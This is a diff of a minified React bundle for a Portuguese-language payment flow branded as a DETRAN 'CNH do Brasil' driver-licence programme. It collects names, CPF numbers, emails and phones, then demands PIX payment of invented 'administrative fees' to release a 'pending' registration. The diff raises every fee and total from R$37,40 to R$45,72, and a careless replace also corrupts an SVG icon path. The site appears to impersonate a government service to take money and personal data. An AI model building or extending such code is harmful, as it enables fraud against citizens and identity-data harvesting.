@@ -14970,7 +14970,7 @@ function gp() {
           body: JSON.stringify({
             nome: C.nome,
             cpf: C.cpf,
-            valor: 37.40,
+            valor: 45.72,
             email: C.email || "",
             telefone: C.phone || "",
             detran: j
@@ -21343,7 +21343,7 @@ function RE() {
                     children: ["• Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
-                    children: "R$12,30"
+                    children: "R$15,12"
                   })]
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
@@ -21351,7 +21351,7 @@ function RE() {
                     children: ["• Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
-                    children: "R$13,75"
+                    children: "R$19,25"
                   })]
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
@@ -21369,7 +21369,7 @@ function RE() {
                     children: "Total:"
                   }), l.jsx("span", {
                     className: "whitespace-nowrap",
-                    children: "R$37,40"
+                    children: "R$45,72"
                   })]
                 })]
               })]
@@ -21442,7 +21442,7 @@ function DE() {
           console.log("PAGAMENTO CONFIRMADO!");
           const I = `fb_conversion_${M}`;
           return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
-            value: (t == null ? void 0 : t.amount) || 37.40,
+            value: (t == null ? void 0 : t.amount) || 45.72,
             currency: "BRL",
             content_name: "Pagamento via PIX - CNH do Brasil",
             content_type: "product",
@@ -21480,7 +21480,7 @@ function DE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 37.40,
+            amount: 45.72,
             customer_name: _.nome,
             customer_email: _.email,
             customer_phone: _.phone,
@@ -21652,7 +21652,7 @@ function DE() {
                 children: "Valor:"
               }), l.jsx("span", {
                 className: "font-bold text-green-600",
-                children: "R$ 37,40"
+                children: "R$ 45,72"
               })]
             }), l.jsxs("div", {
               className: "flex justify-between items-center",
@@ -21717,7 +21717,7 @@ function DE() {
             className: "text-center mb-6",
             children: [l.jsxs("p", {
               className: "text-3xl font-bold text-green-600",
-              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "37,40"]
+              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "45,72"]
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Valor a ser pago"
@@ -21782,7 +21782,7 @@ function DE() {
               }), l.jsx("li", {
                 children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
-                children: "4. Confirme o pagamento de R$ 37,40"
+                children: "4. Confirme o pagamento de R$ 45,72"
               })]
             })]
           }), l.jsxs("div", {
@@ -22069,7 +22069,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
             const ge = window.fbq;
             ge("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 37.40,
+              value: (m == null ? void 0 : m.amount) || 45.72,
               currency: "BRL",
               content_type: "product",
               content_ids: [B],
@@ -22094,7 +22094,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
             const Y = window.fbq;
             Y("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 37.40,
+              value: (m == null ? void 0 : m.amount) || 45.72,
               currency: "BRL",
               content_type: "product",
               content_ids: [m.deposit_id],
@@ -22189,7 +22189,7 @@ function OE() {
     const Y = "fb_addtocart_chat_tracked";
     if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
       window.fbq("track", "AddToCart", {
-        value: 37.40,
+        value: 45.72,
         currency: "BRL",
         content_name: "Taxa DETRAN - CNH do Brasil",
         content_type: "product"
@@ -22226,7 +22226,7 @@ function OE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 37.40,
+            amount: 45.72,
             customer_name: ge.nome,
             customer_email: ge.email || "cliente@email.com",
             customer_phone: ge.phone || "11999999999",
@@ -22280,11 +22280,11 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
     }, xw = async () => {
       tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-• Taxa de Expedição de Documento (TED): R$ 12,30
-• Taxa de Serviços Administrativos (TSA): R$ 13,75
+• Taxa de Expedição de Documento (TED): R$ 15,12
+• Taxa de Serviços Administrativos (TSA): R$ 19,25
 • Taxa de Processamento Eletrônico (TPE): R$ 11,35
 
-Valor Total: R$ 37,40`, 3e3), i("finalize_button")
+Valor Total: R$ 45,72`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22307,7 +22307,7 @@ Valor Total: R$ 37,40`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 37,40, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 45,72, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -22929,7 +22929,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,40, clique no botão 
                       children: "TAXA DE EXPEDIÇÁƒO DE DOCUMENTO (TED)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "12,30"
+                      children: "15,12"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22938,7 +22938,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,40, clique no botão 
                       children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "13,75"
+                      children: "19,25"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22954,7 +22954,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,40, clique no botão 
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "37,40"
+                      children: "45,72"
                     })]
                   })]
                 })]
@@ -23062,7 +23062,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,40, clique no botão 
                       children: "VALOR A PAGAR EM REAIS"
                     }), l.jsx("p", {
                       className: "font-bold text-lg",
-                      children: "R$ 37,40"
+                      children: "R$ 45,72"
                     })]
                   })]
                 }), o === "awaiting_payment" && l.jsx("div", {
@@ -23417,7 +23417,7 @@ function VE() {
                   children: "TED"
                 }), l.jsx("p", {
                   className: "font-semibold",
-                  children: "R$ 12,30"
+                  children: "R$ 15,12"
                 })]
               }), l.jsxs("div", {
                 children: [l.jsx("p", {
@@ -23425,7 +23425,7 @@ function VE() {
                   children: "TSA"
                 }), l.jsx("p", {
                   className: "font-semibold",
-                  children: "R$ 13,75"
+                  children: "R$ 19,25"
                 })]
               }), l.jsxs("div", {
                 children: [l.jsx("p", {
@@ -23981,7 +23981,7 @@ function sT(e) {
     child: [{
       tag: "path",
       attr: {
-        d: "M510.37 237.40l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"
+        d: "M510.37 245.72l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"
       },
       child: []
     }]
